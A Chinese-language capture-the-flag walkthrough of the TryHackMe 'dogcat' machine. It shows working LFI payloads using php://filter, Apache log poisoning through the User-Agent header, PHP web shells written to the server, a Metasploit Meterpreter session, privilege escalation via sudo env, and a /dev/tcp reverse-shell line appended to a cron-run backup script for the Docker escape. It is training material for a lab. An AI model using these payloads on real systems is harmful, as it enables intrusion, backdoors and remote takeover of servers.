# 免责声明
>本文渗透的主机经过合法授权。本文使用的工具和方法仅限学习交流使用，请不要将文中使用的工具和渗透思路用于任何非法用途，对此产生的一切后果，本人不承担任何责任，也不对造成的任何误用或损害负责。

# 服务发现
```
┌──(root💀kali)-[~/tryhackme]
└─#  nmap -sV -Pn 10.10.228.190                         
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-23 01:40 EDT
Nmap scan report for 10.10.108.119
Host is up (0.31s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 39.93 seconds

```

# 目录爆破，只有cat和dog两个已知文件夹，各有10张图片
```
┌──(root💀kali)-[~/dirsearch]
└─#  python3 dirsearch.py -u "http://10.10.108.119" -w /usr/share/wordlists/Web-Content/directory-list-2.3-medium.txt -e* -t 100

 _|. _ _  _  _  _ _|_    v0.3.8
(_||| _) (/_(_|| (_| )

Extensions: * | HTTP method: get | Threads: 100 | Wordlist size: 220521

Error Log: /root/dirsearch/logs/errors-21-09-23_01-46-47.log

Target: http://10.10.108.119

[01:46:48] Starting: 
[01:46:49] 200 -  418B  - /
[01:47:04] 301 -  311B  - /cats  ->  http://10.10.108.119/cats/
[01:47:10] 301 -  311B  - /dogs  ->  http://10.10.108.119/dogs/
[01:52:19] 403 -  277B  - /server-status  
```

经分析验证首页view参数存在一个LFI，并且构造参数一定要包含cat或者dog，否则会显示```Sorry, only dogs or cats are allowed.```
并且文件后缀添加了.php，我们估计源代码大概是这样的
```
$dir = $_GET["view"] .'.php';
include($dir);
```



构造payload
```/?view=php://filter/read=convert.base64-encode/resource=./cat/../index```

得到index.php的源码base64字符串
```
PCFET0NUWVBFIEhUTUw+CjxodG1sPgoKPGhlYWQ+CiAgICA8dGl0bGU+ZG9nY2F0PC90aXRsZT4KICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgdHlwZT0idGV4dC9jc3MiIGhyZWY9Ii9zdHlsZS5jc3MiPgo8L2hlYWQ+Cgo8Ym9keT4KICAgIDxoMT5kb2djYXQ8L2gxPgogICAgPGk+YSBnYWxsZXJ5IG9mIHZhcmlvdXMgZG9ncyBvciBjYXRzPC9pPgoKICAgIDxkaXY+CiAgICAgICAgPGgyPldoYXQgd291bGQgeW91IGxpa2UgdG8gc2VlPzwvaDI+CiAgICAgICAgPGEgaHJlZj0iLz92aWV3PWRvZyI+PGJ1dHRvbiBpZD0iZG9nIj5BIGRvZzwvYnV0dG9uPjwvYT4gPGEgaHJlZj0iLz92aWV3PWNhdCI+PGJ1dHRvbiBpZD0iY2F0Ij5BIGNhdDwvYnV0dG9uPjwvYT48YnI+CiAgICAgICAgPD9waHAKICAgICAgICAgICAgZnVuY3Rpb24gY29udGFpbnNTdHIoJHN0ciwgJHN1YnN0cikgewogICAgICAgICAgICAgICAgcmV0dXJuIHN0cnBvcygkc3RyLCAkc3Vic3RyKSAhPT0gZmFsc2U7CiAgICAgICAgICAgIH0KCSAgICAkZXh0ID0gaXNzZXQoJF9HRVRbImV4dCJdKSA/ICRfR0VUWyJleHQiXSA6ICcucGhwJzsKICAgICAgICAgICAgaWYoaXNzZXQoJF9HRVRbJ3ZpZXcnXSkpIHsKICAgICAgICAgICAgICAgIGlmKGNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICdkb2cnKSB8fCBjb250YWluc1N0cigkX0dFVFsndmlldyddLCAnY2F0JykpIHsKICAgICAgICAgICAgICAgICAgICBlY2hvICdIZXJlIHlvdSBnbyEnOwogICAgICAgICAgICAgICAgICAgIGluY2x1ZGUgJF9HRVRbJ3ZpZXcnXSAuICRleHQ7CiAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgIGVjaG8gJ1NvcnJ5LCBvbmx5IGRvZ3Mgb3IgY2F0cyBhcmUgYWxsb3dlZC4nOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgPz4KICAgIDwvZGl2Pgo8L2JvZHk+Cgo8L2h0bWw+Cg==
```

解密后
```
<!DOCTYPE HTML>
<html>

<head>
    <title>dogcat</title>
    <link rel="stylesheet" type="text/css" href="/style.css">
</head>

<body>
    <h1>dogcat</h1>
    <i>a gallery of various dogs or cats</i>

    <div>
        <h2>What would you like to see?</h2>
        <a href="/?view=dog"><button id="dog">A dog</button></a> <a href="/?view=cat"><button id="cat">A cat</button></a><br>
        <?php
            function containsStr($str, $substr) {
                return strpos($str, $substr) !== false;
            }
        $ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
            if(isset($_GET['view'])) {
                if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
                    echo 'Here you go!';
                    include $_GET['view'] . $ext;
                } else {
                    echo 'Sorry, only dogs or cats are allowed.';
                }
            }
        ?>
    </div>
</body>

</html>
```

## 源码分析
大概与我们猜想的一致，需要留意``` $ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';```这行代码，文件后缀其实是可以指定的，不指定默认是```.php```

构造参数读取/etc/passwd文件
```http://10.10.108.119/?view=php://filter/read=convert.base64-encode/resource=./cat/../../../../etc/passwd&ext=&```

解密为
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
```
居然没有普通用户


找到access.log路径
```
?view=php://filter/read=convert.base64-encode/resource=./cat/../../../../var/log/apache2/access.log&ext=&
```

base64decode完后查看log记录
```
127.0.0.1 - - [03/Nov/2021:08:42:41 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
127.0.0.1 - - [03/Nov/2021:08:43:15 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
127.0.0.1 - - [03/Nov/2021:08:43:52 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
10.13.21.169 - - [03/Nov/2021:08:44:01 +0000] "GET /?view=php://filter/read=convert.base64-encode/resource=./cat/../../../../etc/passwd&ext=& HTTP/1.1" 200 1071 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
10.13.21.169 - - [03/Nov/2021:08:44:01 +0000] "GET /style.css HTTP/1.1" 200 662 "http://10.10.108.119/?view=php://filter/read=convert.base64-encode/resource=./cat/../../../../etc/passwd&ext=&" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
10.13.21.169 - - [03/Nov/2021:08:44:02 +0000] "GET /favicon.ico HTTP/1.1" 404 455 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
```

由记录可见，记录了url和user-agent，我们打开burpsuite，把下面代码放到user-agent，验证是否存在文件解析漏洞
```<?php phpinfo(); ?>```
点击页面触发，可以显示php版本信息，证明漏洞存在
```?view=./cat/../../../../var/log/apache2/access.log&ext=&```

# getshell

这里我试了很多方法也反弹不了shell，于是我把下面的脚本作为一个简单的websdll写进了日志
```
<?php system($_GET['cmd']);?>
```

burosuite上为：
```
GET /?view=./cat/../../../../var/log/apache2/access.log&ext=&cmd=ls HTTP/1.1
Host: 10.10.228.190
User-Agent: "<?php system($_GET['cmd']);?>"
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
```

这个时候就可以通过cmd的传参执行命令
```
/?view=./cat/../../../../var/log/apache2/access.log&ext=&cmd=whoami
```

在这里我依然反弹不了shell，只好通过一个比较绕的方法拿到稳定的webshell

用下面的payload把一句话木马写进服务器

```/?view=./cat/../../../../var/log/apache2/access.log&ext=&cmd=echo '<?php @eval($_POST[c]);?>' >%20 /var/www/html/shell.php```


打开msf，选择中国菜刀，填好相关配置信息

```
msf6 exploit(multi/http/caidao_php_backdoor_exec) > options

Module options (exploit/multi/http/caidao_php_backdoor_exec):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD   c                yes       The password of backdoor
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     10.10.108.119    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /shell.php       yes       The path of backdoor
   VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  tun0             yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port
```


拿到webshell
```
msf6 exploit(multi/http/caidao_php_backdoor_exec) > run

[*] Started reverse TCP handler on 10.13.21.169:4444 
[*] Sending exploit...
[*] Exploit completed, but no session was created.
msf6 exploit(multi/http/caidao_php_backdoor_exec) > run

[*] Started reverse TCP handler on 10.13.21.169:4444 
[*] Sending exploit...
[*] Sending stage (39282 bytes) to 10.10.108.119
[*] Meterpreter session 1 opened (10.13.21.169:4444 -> 10.10.108.119:48230) at 2021-11-03 08:20:09 -0400

meterpreter > shell
Process 179 created.
Channel 0 created.
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```


在```/var/www/html```找到flag1

在```/var/www```找到flag2

# 提权
用```/bin/sh -i```切换成tty

查看当前用户超级权限
```
$ sudo -l
Matching Defaults entries for www-data on 679ddf26d89f:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on 679ddf26d89f:
    (root) NOPASSWD: /usr/bin/env
```

发现可以直接使用```env```提权


直接提权到root

```
$ sudo /usr/bin/env /bin/sh
id
uid=0(root) gid=0(root) groups=0(root)
whoami
root

```

全局查找flag相关文件：
```find / -name *flag*```
在```/root/flag3.txt```找到flag3

在系统里查找所有文件里包含flag字样的文件：
```find / |xargs grep -ri 'flag' -l ```


发现一个可疑的文件
```/opt/backups/backup.tar```

解压出来以后发现是一个docker的container，也就是说这个系统是在docker里面的


# Docker逃逸
我们之所以找不到flag4，是因为我们是在docker里面，这个时候需要利用docker逃逸到宿主机

关于Docker逃逸，推荐参考[这篇文章](https://xz.aliyun.com/t/8558)

```/opt/backups```应该是宿主机和Docker机器的共享文件夹

查看```/opt/backups```下的```backup.sh```文件，猜测这个脚本会被宿主机定时执行
```
# cat backup.sh
#!/bin/bash
tar cf /root/container/backup/backup.tar /root/container

```
我们把下面的命令追加到```backup.sh```文件:
```echo 'bash -i >& /dev/tcp/10.13.21.169/4455 0>&1' >> backup.sh```


另起一个端口，等待大约一分钟，收到宿主机的反弹shell，拿到flag4：

```
┌──(root💀kali)-[~/tryhackme/dogcat]
└─# nc -lnvp 4455
listening on [any] 4455 ...
connect to [10.13.21.169] from (UNKNOWN) [10.10.108.119] 47114
bash: cannot set terminal process group (15772): Inappropriate ioctl for device
bash: no job control in this shell
root@dogcat:~# ls
ls
container
flag4.txt
```